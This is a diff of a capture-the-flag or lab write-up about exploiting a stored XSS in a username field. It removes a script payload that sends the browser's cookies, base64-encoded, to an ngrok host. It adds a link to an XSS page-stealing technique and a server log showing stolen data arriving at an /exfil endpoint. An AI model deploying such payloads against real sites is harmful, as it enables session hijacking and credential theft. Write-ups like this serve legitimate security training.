@@ -117,8 +117,25 @@ Yessss, the username parameter was actually vulnerable to XSS.
 
 * Registering new user with XSS payload that will give us admin cookie.
 
-Payload i Used:
+We need to steal contents of a file from a server with XSS, upon google searching we can go on following link
 
-```javascript
-<script>var i=new Image(); i.src="https://7140-122-177-17-117.ngrok-free.app/?cookiez="+btoa(document.cookie);</script>
+{% embed url="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#steal-page-content" %}
+
+Using that we get creds,
+
+```bash
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.17.41.43 - - [21/Mar/2024 09:52:51] "GET /steal.js HTTP/1.1" 200 -
+10.17.41.43 - - [21/Mar/2024 09:52:51] "GET /steal.js HTTP/1.1" 200 -
+10.17.41.43 - - [21/Mar/2024 09:52:51] code 404, message File not found
+10.17.41.43 - - [21/Mar/2024 09:52:51] "GET /exfil? HTTP/1.1" 404 -
+10.10.234.35 - - [21/Mar/2024 09:53:03] "GET /steal.js HTTP/1.1" 200 -
+10.10.234.35 - - [21/Mar/2024 09:53:03] code 404, message File not found
+10.10.234.35 - - [21/Mar/2024 09:53:03] "GET /exfil?amFjazpXaHl <snip> Z0lESwo= HTTP/1.1" 404 -
+
 ```
+
+
+
+
+
